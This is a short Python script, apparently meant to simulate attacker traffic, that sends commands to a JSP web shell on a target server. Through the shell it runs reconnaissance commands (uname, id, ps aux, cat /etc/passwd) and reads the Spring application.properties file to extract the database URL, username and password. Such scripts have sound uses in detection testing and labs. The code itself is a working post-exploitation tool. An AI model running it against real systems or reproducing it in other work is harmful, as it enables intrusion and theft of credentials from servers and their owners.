import requests
import sys
import json

def format_list(list):
    formatted = list.split('\n')
    return formatted

def execute_command(url, cmd):
    request = requests.get(url, params={"cmd": cmd})
    return request.text.replace('\x00', '').strip()

def perform_reconnaissance(url):
    dbname_placeholder = "spring.datasource.username="
    dbpass_placeholder = "spring.datasource.password="
    db_placeholder = "spring.datasource.url="
    recon_data = {}
    recon_data.update({"os": execute_command(url, "uname -a")})
    recon_data.update({"user": execute_command(url, "id")})
    recon_data.update({"passwd": format_list(execute_command(url, "cat /etc/passwd"))})
    recon_data.update({"processes": execute_command(url, "ps aux")})
    recon_data.update({"application.properties": format_list(execute_command(url, "cat src/main/resources/application.properties"))})
    for property in recon_data.get("application.properties"):
        if dbname_placeholder in property:
            recon_data.update({"dbname": property[len(dbname_placeholder):] })
        if dbpass_placeholder in property:
            recon_data.update({"dbpass": property[len(dbpass_placeholder):] })
        if db_placeholder in property:
            recon_data.update({"db": property[len(db_placeholder):]})
    return recon_data


def main():
    if len(sys.argv) != 2:
        print("Program expects a url as an argument python3 simulate_attacker_traffic.py <url/to/jsp>")
        sys.exit(1)
    webshell_url = sys.argv[1]
    r = requests.get(webshell_url, params={"cmd": "id"})
    if r.status_code != 200:
        print("Provided url seems invalid. Please try again...")
        sys.exit(1)
    else:
        print("Webshell located, performing attack")
    print("[*] Performing reconnaissance")
    print(json.dumps(perform_reconnaissance(webshell_url), indent=2))

    

if __name__ == '__main__':
    main()